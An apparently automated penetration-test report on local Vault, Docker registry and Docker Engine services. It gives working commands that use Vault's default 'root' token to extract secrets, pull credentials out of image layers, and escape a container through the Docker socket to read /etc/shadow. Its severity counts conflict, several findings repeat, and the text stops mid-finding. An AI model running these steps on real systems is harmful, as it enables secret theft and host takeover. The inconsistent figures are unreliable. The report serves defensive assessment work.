# Vulnerability Assessment Report — 127.0.0.1:5000

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-01T19:41:06Z  
**Target:** 127.0.0.1:5000  
**Campaign:** camp_20260801_2bd90d3f  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**127.0.0.1:5000**) presents an **extremely poor security posture**. Our team confirmed 15 critical and 15 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Root Token with Trivially Guessable Value "root"**  
The HashiCorp Vault instance uses a root token with the trivially guessable value "root". This token has unlimited privileges (root policy), no TTL, no expiration, and is not renewable — it is effecti...

**2. Root Token with Trivially Guessable Value "root" — Full Vault Compromise**  
HashiCorp Vault 2.0.3 is running in dev mode with the root token set to the trivially guessable value "root". This token has no TTL, no expiration, and root policy granting unlimited privileges over a...

**3. Unauthenticated Docker Engine API — Full Host Root Equivalent via Socket**  
The Docker Engine API at /var/run/docker.sock is accessible without authentication. Any process with socket access can create privileged containers, mount the host filesystem, read/write any host file...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Comprehensive internal assessment of three infrastructure services (HashiCorp Vault, OCI Registry, Docker Engine) on 127.0.0.1 revealed 41 findings including 12 critical, 12 high, 7 medium, and 2 low severity vulnerabilities. All three services were fully compromised: Vault secrets extracted via trivial root token "root"; container registry image layers yielded hardcoded AWS and PostgreSQL credentials with anonymous push access enabling supply-chain attacks; Docker socket access proved complete host escape with /etc/shadow password hash extraction. The environment operates with zero audit logging, no TLS encryption, no authentication on any service, and 10+ credential sets exposed in container environment variables. Immediate remediation is required across all services.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 15 | 8 | 7 |
| HIGH | 15 | 0 | 15 |
| MEDIUM | 9 | 0 | 9 |
| LOW | 2 | 0 | 2 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **41** | **8** | **33** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_649127` | Root Token with Trivially Guessable Value "root" | CRITICAL | 10.0 | **EXPLOITED** | `127.0.0.1:8200/v1/auth/token/lookup-self` |
| 2 | `vuln_e5397d` | Root Token with Trivially Guessable Value "root" —... | CRITICAL | 10.0 | **EXPLOITED** | `127.0.0.1:8200/v1/sys/health` |
| 3 | `vuln_6a70ba` | Unauthenticated Docker Engine API — Full Host Root... | CRITICAL | 10.0 | **EXPLOITED** | `unix:///var/run/docker.sock` |
| 4 | `vuln_ecceea` | Docker Socket Mounted into Running Containers — Di... | CRITICAL | 9.9 | Confirmed | `unix:///var/run/docker.sock (mounted in containers...` |
| 5 | `vuln_72ea1b` | Production Secrets Extracted from KV v2 Engine (AW... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8200/v1/secret/data/prod/app` |
| 6 | `vuln_eac57f` | Hardcoded AWS Secret Access Key Exposed in Image L... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:[REDACTED]:800ea3...` |
| 7 | `vuln_68822a` | Hardcoded PostgreSQL Database Credentials Exposed ... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:[REDACTED]:800ea3...` |
| 8 | `vuln_626080` | Anonymous Push Access Allows Supply-Chain Image Su... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:[REDACTED]` |
| 9 | `vuln_8f3af7` | Production Secrets Extracted — AWS Access Key and ... | CRITICAL | 9.8 | **EXPLOITED** | `127.0.0.1:8200/v1/secret/data/prod/app` |
| 10 | `vuln_143d95` | Anonymous Push Access to Container Registry — Supp... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:[REDACTED]` |
| 11 | `vuln_38e7a6` | Hardcoded PostgreSQL Credentials in Container Imag... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:[REDACTED]:800ea3...` |
| 12 | `vuln_bff05a` | Hardcoded AWS Secret Access Key in Container Image... | CRITICAL | 9.8 | Confirmed | `127.0.0.1:[REDACTED]:800ea3...` |
| 13 | `vuln_8b029a` | Host /etc/shadow Readable — Password Hash Extracti... | CRITICAL | 9.8 | **EXPLOITED** | `unix:///var/run/docker.sock → /etc/shadow` |
| 14 | `vuln_afe2f2` | Root-Level Orphan Token Created via Token Auth — P... | CRITICAL | 9.1 | **EXPLOITED** | `127.0.0.1:8200/v1/auth/token/create-orphan` |
| 15 | `vuln_7cd283` | Root-Level Orphan Token Created — Persistent Backd... | CRITICAL | 9.1 | **EXPLOITED** | `127.0.0.1:8200/v1/auth/token/create-orphan` |
| 16 | `vuln_db4307` | Vault Dev Root Token Exposed in Container Environm... | HIGH | 8.6 | Confirmed | `unix:///var/run/docker.sock → /dm-vault container ...` |
| 17 | `vuln_2f0f81` | API Keys Exposed in Container Environment Variable... | HIGH | 8.2 | Confirmed | `unix:///var/run/docker.sock → /opencode container ...` |
| 18 | `vuln_74d70d` | Unauthenticated Docker Registry — Full Anonymous R... | HIGH | 7.5 | Confirmed | `127.0.0.1:5000/v2/_catalog` |
| 19 | `vuln_62773c` | No Audit Devices Enabled — All Vault Operations Un... | HIGH | 7.5 | Confirmed | `127.0.0.1:8200/v1/sys/audit` |
| 20 | `vuln_80f717` | Shamir Seal with Single Key Share (Threshold 1/1) ... | HIGH | 7.5 | Confirmed | `127.0.0.1:8200/v1/sys/seal-status` |
| 21 | `vuln_f4532f` | Secrets Permanently Visible in Image Config Build ... | HIGH | 7.5 | Confirmed | `127.0.0.1:[REDACTED]:69553f...` |
| 22 | `vuln_f86f43` | No Audit Devices Enabled — All Operations Invisibl... | HIGH | 7.5 | Confirmed | `127.0.0.1:8200/v1/sys/audit` |
| 23 | `vuln_3242cc` | Shamir Seal with Single Key Share (1/1) — No Split... | HIGH | 7.5 | Confirmed | `127.0.0.1:8200/v1/sys/seal-status` |
| 24 | `vuln_c4d2b9` | Unauthenticated Container Registry — Full Anonymou... | HIGH | 7.5 | Confirmed | `127.0.0.1:5000/v2/_catalog` |
| 25 | `vuln_61286d` | Secrets Permanently Visible in Image Config Build ... | HIGH | 7.5 | Confirmed | `127.0.0.1:[REDACTED]:69553f...` |
| 26 | `vuln_036872` | Multiple Database Credentials Exposed in Container... | HIGH | 7.5 | Confirmed | `unix:///var/run/docker.sock → multiple database co...` |
| 27 | `vuln_6c556e` | Moodle Admin Credentials and SMTP Config Exposed i... | HIGH | 7.5 | Confirmed | `unix:///var/run/docker.sock → /moodle-test-moodle-...` |
| 28 | `vuln_a2be41` | Kubernetes Config Mounted into Containers — Cluste... | HIGH | 7.5 | Confirmed | `unix:///var/run/docker.sock → container bind mount...` |
| 29 | `vuln_2e815d` | TLS Disabled on Vault Listener — Cleartext HTTP AP... | HIGH | 7.4 | Confirmed | `127.0.0.1:[REDACTED]` |
| 30 | `vuln_421098` | TLS Disabled — All Vault Traffic in Cleartext | HIGH | 7.4 | Confirmed | `127.0.0.1:[REDACTED]` |
| 31 | `vuln_d8952b` | Multiple Containers Running with Host Network Mode... | MEDIUM | 6.5 | Confirmed | `unix:///var/run/docker.sock → multiple containers` |
| 32 | `vuln_4a33e2` | Jenkins Running with Setup Wizard Disabled — Unaut... | MEDIUM | 6.5 | Confirmed | `unix:///var/run/docker.sock → /dm-jenkins containe...` |
| 33 | `vuln_f36f94` | In-Memory Storage Backend — No Persistence, No HA,... | MEDIUM | 5.9 | Confirmed | `127.0.0.1:[REDACTED]` |
| 34 | `vuln_2058f7` | Registry Serves Over Plaintext HTTP Without TLS En... | MEDIUM | 5.9 | Confirmed | `127.0.0.1:5000/v2/` |
| 35 | `vuln_0ef361` | In-Memory Storage Backend — No Persistence, No HA | MEDIUM | 5.9 | Confirmed | `127.0.0.1:[REDACTED]` |
| 36 | `vuln_0f8405` | Container Registry Serves Over Plaintext HTTP With... | MEDIUM | 5.9 | Confirmed | `127.0.0.1:5000/v2/` |
| 37 | `vuln_e1e70f` | Unauthenticated Information Disclosure via sys/hea... | MEDIUM | 5.3 | Confirmed | `127.0.0.1:8200/v1/sys/health` |
| 38 | `vuln_c5b727` | Unauthenticated Information Disclosure — Vault Ver... | MEDIUM | 5.3 | Confirmed | `127.0.0.1:8200/v1/sys/health` |
| 39 | `vuln_0f7e7d` | Memory Locking Disabled (disable_mlock=true) — Sec... | MEDIUM | 4.7 | Confirmed | `127.0.0.1:[REDACTED]` |
| 40 | `vuln_c6b7b8` | Vault UI Enabled — Increases Attack Surface | LOW | 3.7 | Confirmed | `127.0.0.1:8200/ui/` |
| 41 | `vuln_3eb659` | SLSA Provenance Attestation Leaks Internal Infrast... | LOW | 3.7 | Confirmed | `127.0.0.1:[REDACTED]:abedfa...` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Root Token with Trivially Guessable Value "root"

| Field | Value |
|-------|-------|
| **ID** | `vuln_649127` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `insecure_credentials` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `http://127.0.0.1:8200/v1/auth/token/lookup-self` |
| **Component** | Vault Token Auth Backend |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:33:15Z |

#### Description

The HashiCorp Vault instance uses a root token with the trivially guessable value "root". This token has unlimited privileges (root policy), no TTL, no expiration, and is not renewable — it is effectively a permanent super-admin credential. The root token value "root" is the default dev-mode token and is trivially guessable. Any attacker who discovers the Vault API endpoint can authenticate with this token and gain full administrative control over all secrets, auth methods, policies, and configuration. The token was validated via auth/token/lookup-self which confirmed policies: ["root"], ttl: 0 (no expiration), orphan: true, type: service.

#### Technical Analysis

The Vault root token is set to the literal string "root", which is the default dev-mode token value. This token has the root policy granting unrestricted access to all Vault paths (sys/*, secret/*, auth/*). The token has no TTL (ttl=0), no expiration (expire_time=null), and is orphan (cannot be revoked by revoking a parent). This constitutes a permanent, trivially guessable super-admin credential that grants complete control over the entire Vault deployment including all secrets, policies, auth methods, and system configuration.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/auth/token/lookup-self | jq .
```

#### Raw Request

```http
GET /v1/auth/token/lookup-self HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root
```

#### Raw Response

```http
{"request_id":"99ba72b6-bc2f-34fd-5b2d-d172a52358ec","data":{"accessor":"fBxD88ZyIY45M11dJjUrRbTY","creation_time":1785603441,"creation_ttl":0,"display_name":"token","entity_id":"","expire_time":null,"explicit_max_ttl":0,"id":"root","meta":null,"num_uses":0,"orphan":true,"path":"auth/token/create","policies":["root"],"renewable":false,"ttl":0,"type":"service"}}
```

#### Evidence / Logs

```
Token lookup-self returned: id="root", policies=["root"], ttl=0, expire_time=null, orphan=true, renewable=false, creation_time=1785603441, type=service. The token has unlimited privileges with no expiration.
```

#### Remediation

1. Immediately revoke the current root token: vault token revoke root. 2. Generate a new root token only when needed using Shamir unseal keys via sys/generate-root/attempt. 3. Never use the dev server mode in production. 4. Use non-trivial, randomly generated token values. 5. Implement time-limited root tokens that automatically expire.

---

### 3.2 — Root Token with Trivially Guessable Value "root" — Full Vault Compromise

| Field | Value |
|-------|-------|
| **ID** | `vuln_e5397d` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1078.001` — Valid Accounts: Default Accounts |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/health` |
| **Component** | HashiCorp Vault Dev Mode |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:37:00Z |

#### Description

HashiCorp Vault 2.0.3 is running in dev mode with the root token set to the trivially guessable value "root". This token has no TTL, no expiration, and root policy granting unlimited privileges over all secrets, policies, auth methods, and system configuration. Any attacker who guesses or discovers this token gains complete administrative control over the entire Vault instance, including the ability to read all secrets, create persistent backdoor tokens, and modify security policies.

#### Technical Analysis

The Vault root token is literally "root" — the default dev-mode token. Authentication with this token grants full administrative control. The token lookup confirms: type=service, policies=[root], TTL=0 (never expires), orphan=true, renewable=false. This is equivalent to having the master key to the entire secrets management infrastructure.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/health
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/sys/auth
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/sys/mounts
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/auth/token/lookup-self
```

#### Evidence / Logs

```
Token "root" accepted — full admin access confirmed
Token type: service, policies: [root], no TTL, no expiration
All sys/*, secret/*, auth/* paths accessible
Vault version: 2.0.3, cluster: vault-cluster-b6261e1f, initialized: true, sealed: false
```

#### Remediation

Never use dev mode in production. Generate a proper root token during initialization with key shares (Shamir's Secret Sharing). Immediately revoke the current root token and re-initialize Vault with proper seal configuration. Use at least a 3-of-5 key threshold.

---

### 3.3 — Unauthenticated Docker Engine API — Full Host Root Equivalent via Socket

| Field | Value |
|-------|-------|
| **ID** | `vuln_6a70ba` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `remote_code_execution` |
| **MITRE ATT&CK** | `T1611` — Escape to Host |
| **ISO 27001** | `A.8.6 - Capacity Management` |
| **Endpoint** | `unix:///var/run/docker.sock` |
| **Component** | Docker Engine 29.2.0 |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:39:26Z |

#### Description

The Docker Engine API at /var/run/docker.sock is accessible without authentication. Any process with socket access can create privileged containers, mount the host filesystem, read/write any host file, and effectively operate as root on the host. This was proven by creating a container that mounted host / and read /etc/hostname (DESKTOP-MNQMJVK) and /etc/shadow (extracting yescrypt hash for user cmehdi).

#### Technical Analysis

Full container-to-host escape proven: Docker socket → create container with host root mount → read /etc/hostname and /etc/shadow → extract password hashes. This is equivalent to unrestricted root access on the host.

#### Exploitation Commands

```bash
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"Image":"alpine:latest","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host:ro"]}}' "http://localhost/containers/create?name=darkmoon-escape-test"
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/darkmoon-escape-test/start
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/darkmoon-escape-test/wait
curl --unix-socket /var/run/docker.sock "http://localhost/containers/darkmoon-escape-test/logs?stdout=true&stderr=true"
```

#### Evidence / Logs

```
Docker Engine 29.2.0, API 1.53
Container created: 6f69061432cf
Host mount escape output: DESKTOP-MNQMJVK (host hostname)
/etc/shadow read: cmehdi:$y$j9T$qSUHqkMyXjP2gAETO5Kg91$c.[REDACTED]:20504:0:99999:7:::
Test containers cleaned up after evidence capture
```

#### Remediation

Enable TLS mutual authentication on the Docker daemon. Never expose the Docker socket to untrusted containers or users. Use Docker socket proxies (e.g., Tecnativa/docker-socket-proxy) to restrict API operations. Implement rootless Docker.

---

### 3.4 — Docker Socket Mounted into Running Containers — Direct Escape Path

| Field | Value |
|-------|-------|
| **ID** | `vuln_ecceea` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.9 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1611` — Escape to Host |
| **ISO 27001** | `A.8.9 - Configuration Management` |
| **Endpoint** | `unix:///var/run/docker.sock (mounted in containers)` |
| **Component** | Docker Engine socket mount |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:39:44Z |

#### Description

Both the /darkmoon and /opencode containers have /var/run/docker.sock bind-mounted (RW). Any process inside these containers can use the Docker API to escape to the host. The darkmoon container also has CAP_NET_ADMIN, CAP_NET_RAW, and host networking.

#### Exploitation Commands

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true
# Inspected darkmoon and opencode containers
```

#### Evidence / Logs

```
/darkmoon: Binds=["/var/run/docker.sock:/var/run/docker.sock:rw"], CapAdd=["CAP_NET_ADMIN","CAP_NET_RAW"], NetworkMode=host
/opencode: Binds=["...docker.sock:/var/run/docker.sock:rw"]
```

#### Remediation

Remove Docker socket mounts from containers. Use Docker socket proxy with read-only, filtered API access. Apply principle of least privilege to container bind mounts.

---

### 3.5 — Production Secrets Extracted from KV v2 Engine (AWS Key + DB Password)

| Field | Value |
|-------|-------|
| **ID** | `vuln_72ea1b` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.004` — Unsecured Credentials: Private Keys |
| **ISO 27001** | `A.10.1.2` |
| **Endpoint** | `http://127.0.0.1:8200/v1/secret/data/prod/app` |
| **Component** | KV v2 Secrets Engine |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:33:35Z |

#### Description

Using the root token, all secrets stored in the KV v2 secrets engine at path secret/prod/app were extracted. The secrets contain production credentials: an AWS access key (AKIAFAKE123) and a database password (S3cr3tDB!). These credentials could be used to pivot to AWS infrastructure and database systems. The secret was stored as KV v2 version 1, created at 2026-08-01T16:57:48Z, with no CAS (Check-and-Set) protection and no version deletion policy.

#### Technical Analysis

Full recursive enumeration of the KV v2 secrets engine at secret/ revealed a single path secret/prod/app containing production credentials. The extracted secrets include: (1) aws_access_key: AKIAFAKE123 - an AWS IAM access key that could be used to access AWS services and infrastructure; (2) db_password: S3cr3tDB! - a database password that could be used to access production databases. The CAS (Check-and-Set) protection is disabled (cas_required=false), meaning secrets can be overwritten without version verification, enabling potential secret tampering by any authorized writer.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" --request LIST http://127.0.0.1:8200/v1/secret/metadata/ | jq .\ncurl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" --request LIST http://127.0.0.1:8200/v1/secret/metadata/prod/ | jq .\ncurl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/secret/data/prod/app | jq .
```

#### Raw Request

```http
GET /v1/secret/data/prod/app HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root
```

#### Raw Response

```http
{"request_id":"8e62772c-3a18-ceef-ff3c-a88c243bb75b","data":{"data":{"aws_access_key":"AKIAFAKE123","db_password":"S3cr3tDB!"},"metadata":{"created_time":"2026-08-01T16:57:48.096962256Z","custom_metadata":null,"deletion_time":"","destroyed":false,"version":1}}}
```

#### Evidence / Logs

```
LIST secret/metadata/ -> keys: ["prod/"]\nLIST secret/metadata/prod/ -> keys: ["app"]\nGET secret/data/prod/app -> data.data: {"aws_access_key":"AKIAFAKE123","db_password":"S3cr3tDB!"}, metadata: version=1, created_time=2026-08-01T16:57:48.096962256Z
```

#### Remediation

1. Rotate the exposed AWS access key immediately (disable AKIAFAKE123 in AWS IAM). 2. Change the database password S3cr3tDB! immediately. 3. Revoke the root token used for extraction. 4. Implement fine-grained ACL policies restricting access to production secrets. 5. Enable CAS protection on the KV v2 mount to prevent unauthorized overwrites. 6. Enable audit logging to detect future unauthorized secret reads. 7. Consider using Vault's dynamic secrets engines (AWS/database) instead of static credentials.

---

### 3.6 — Hardcoded AWS Secret Access Key Exposed in Image Layer (corp/backend:latest)

| Field | Value |
|-------|-------|
| **ID** | `vuln_eac57f` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.2.4 Management of secret authentication information of users` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:800ea318227d920675c...` |
| **Component** | corp/backend:latest image layer |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:33:56Z |

#### Description

The container image corp/backend:latest contains a hardcoded AWS Secret Access Key baked into the image during the Docker build process. The Dockerfile RUN command explicitly writes AWS_SECRET_ACCESS_KEY=[REDACTED] into /app/.env. This credential is visible in both the image config blob's build history AND extractable from image layer sha256:800ea318227d920675c475fca7bce61bb36c37970c350a3a593e709950dd8cfc. Since the registry allows anonymous access, any network-reachable attacker can extract this AWS credential without authentication. The key format follows the standard AWS secret key pattern but contains 'FAKE' and 'EXAMPLE' in the value, suggesting it may be a placeholder — however it is still baked into a production-path image.

#### Technical Analysis

The image config blob (sha256:69553fa838ed) was pulled anonymously and its .history array reveals the exact Dockerfile RUN command that writes the AWS secret key into /app/.env. The actual layer blob (sha256:800ea318227d, 220 bytes) was downloaded, extracted as a tar.gz archive containing app/.env, and the file contents confirm AWS_SECRET_ACCESS_KEY=[REDACTED]. The credential value contains 'FAKE' and 'EXAMPLE' substrings suggesting it may be a test/placeholder key, but the practice of baking any credential into image layers is a critical security anti-pattern as layers are immutable and the credential persists forever in the registry.

#### Exploitation Commands

```bash
curl -s http://127.0.0.1:[REDACTED]:69553fa838ed526b45a390e3102e171a6b66690447028abd346df0f80500639a | jq .history
curl -s http://127.0.0.1:[REDACTED]:800ea318227d920675c475fca7bce61bb36c37970c350a3a593e709950dd8cfc -o /tmp/layer2.tar.gz
tar xzf /tmp/layer2.tar.gz -C /tmp/registry-extract/layer2
cat /tmp/registry-extract/layer2/app/.env
```

#### Raw Request

```http
GET /v2/corp/backend/blobs/sha256:800ea318227d920675c475fca7bce61bb36c37970c350a3a593e709950dd8cfc HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[layer tar.gz content containing app/.env with AWS_SECRET_ACCESS_KEY=[REDACTED]]
```

#### Evidence / Logs

```
Config blob history shows: RUN /bin/sh -c mkdir -p /app && echo "AWS_SECRET_ACCESS_KEY=[REDACTED]" > /app/.env
Layer 2 contents: app/ app/.env
Extracted /app/.env contents: AWS_SECRET_ACCESS_KEY=[REDACTED]
```

#### Remediation

1. Remove the hardcoded AWS credential from the Dockerfile and all image layers. 2. Use Docker build secrets (--mount=type=secret) or runtime environment injection instead of baking secrets into RUN commands. 3. Rotate the exposed AWS secret key immediately. 4. Rebuild the image without the credential and re-push. 5. Implement image scanning (Trivy, Grype) in the CI/CD pipeline to detect secrets before push.

---

### 3.7 — Hardcoded PostgreSQL Database Credentials Exposed in Image Layer (corp/backend:latest)

| Field | Value |
|-------|-------|
| **ID** | `vuln_68822a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.2.4 Management of secret authentication information of users` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:800ea318227d920675c...` |
| **Component** | corp/backend:latest image layer |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:34:16Z |

#### Description

The container image corp/backend:latest contains a hardcoded PostgreSQL database connection string with embedded credentials baked into the image during build. The Dockerfile RUN command writes db=postgres://admin:S3cr3t@db/prod into /app/.env. This connection string reveals: database user 'admin', password 'S3cr3t', database host 'db', and database name 'prod'. The credential is visible in the config blob build history and extractable from layer sha256:800ea318227d. Combined with anonymous registry access, any attacker can extract this database credential and potentially access the production database.

#### Technical Analysis

The image config blob (sha256:69553fa838ed) history shows a Dockerfile RUN instruction that appends a PostgreSQL connection DSN into /app/.env. The layer blob (sha256:800ea318227d, 220 bytes) was downloaded and extracted, confirming the file contains db=postgres://admin:S3cr3t@db/prod. This exposes the production database credentials (username: admin, password: S3cr3t) to anyone who can pull the image. Since the registry is unauthenticated, the entire credential chain from registry access to database compromise requires zero authentication.

#### Exploitation Commands

```bash
curl -s http://127.0.0.1:[REDACTED]:69553fa838ed526b45a390e3102e171a6b66690447028abd346df0f80500639a | jq .history
curl -s http://127.0.0.1:[REDACTED]:800ea318227d920675c475fca7bce61bb36c37970c350a3a593e709950dd8cfc -o /tmp/layer2.tar.gz
tar xzf /tmp/layer2.tar.gz -C /tmp/registry-extract/layer2
cat /tmp/registry-extract/layer2/app/.env
```

#### Raw Request

```http
GET /v2/corp/backend/blobs/sha256:800ea318227d920675c475fca7bce61bb36c37970c350a3a593e709950dd8cfc HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[layer tar.gz extracted to app/.env containing: db=postgres://admin:S3cr3t@db/prod]
```

#### Evidence / Logs

```
Config blob history reveals: RUN /bin/sh -c mkdir -p /app && echo "db=postgres://admin:S3cr3t@db/prod" >> /app/.env
Extracted /app/.env line 2: db=postgres://admin:S3cr3t@db/prod
Credentials: user=admin, password=S3cr3t, host=db, database=prod
```

#### Remediation

1. Remove the hardcoded database credentials from the Dockerfile and all image layers. 2. Inject database credentials at runtime via environment variables or a secrets manager (Vault, AWS Secrets Manager, K8s Secrets). 3. Rotate the PostgreSQL password 'S3cr3t' immediately. 4. Rebuild the image without embedded credentials. 5. Implement least-privilege database accounts instead of 'admin'. 6. Restrict database network access with firewall rules.

---

### 3.8 — Anonymous Push Access Allows Supply-Chain Image Substitution

| Field | Value |
|-------|-------|
| **ID** | `vuln_626080` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1195.002` — Supply Chain Compromise: Compromise Software Supply Chain |
| **ISO 27001** | `A.14.2.7 Outsourced development` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Component** | Docker Distribution Registry v2 |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:34:43Z |

#### Description

The Docker Registry v2 at 127.0.0.1:5000 permits anonymous (unauthenticated) blob uploads. A POST to /v2/corp/backend/blobs/uploads/ without any authentication returns HTTP 202 Accepted with a Docker-Upload-UUID and a Location header for completing the upload. This means any attacker on the network can push arbitrary image layers and manifests to any repository, including replacing existing tags (e.g., 'latest') with malicious images. This is a critical supply-chain attack vector: an attacker could inject backdoored images that would be pulled by production Kubernetes clusters or CI/CD systems.

#### Technical Analysis

An unauthenticated POST request to the blob upload initiation endpoint returned HTTP 202 Accepted, proving the registry accepts push operations without any credentials. The response includes a Docker-Upload-UUID (5a0cc255-08f2-4a33-8f9c-de3f51bbf5ab) and a Location URL for completing the multi-part upload. An attacker could use this to: (1) upload a malicious layer blob, (2) upload a poisoned config blob, (3) push a new manifest pointing to these blobs under an existing tag like 'latest', effectively replacing the production image with a backdoored version. This constitutes a confirmed supply-chain attack vector.

#### Exploitation Commands

```bash
curl -s -i -X POST http://127.0.0.1:[REDACTED]
```

#### Raw Request

```http
POST /v2/corp/backend/blobs/uploads/ HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
HTTP/1.1 202 Accepted
Content-Length: 0
Docker-Distribution-Api-Version: registry/2.0
Docker-Upload-Uuid: 5a0cc255-08f2-4a33-8f9c-de3f51bbf5ab
Location: http://IP_PRIVATE_003:[REDACTED]-08f2-4a33-8f9c-de3f51bbf5ab?_state=[REDACTED_AWS_SECRET]-[REDACTED]%3D%3D
Range: 0-0
X-Content-Type-Options: nosniff
```

#### Evidence / Logs

```
HTTP/1.1 202 Accepted
Docker-Upload-Uuid: 5a0cc255-08f2-4a33-8f9c-de3f51bbf5ab
Location: http://IP_PRIVATE_003:[REDACTED]-08f2-4a33-8f9c-de3f51bbf5ab?_state=...
Range: 0-0
```

#### Remediation

1. Enable authentication on the registry immediately — configure htpasswd, LDAP, or token-based auth. 2. Deploy a registry with built-in RBAC (Harbor, Artifactory) to separate read and write permissions. 3. Enable content trust / image signing (Notary/cosign) so that pulled images are verified against known signatures. 4. Restrict push access to CI/CD service accounts only. 5. Monitor registry audit logs for unauthorized push events.

---

### 3.9 — Production Secrets Extracted — AWS Access Key and Database Password

| Field | Value |
|-------|-------|
| **ID** | `vuln_8f3af7` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
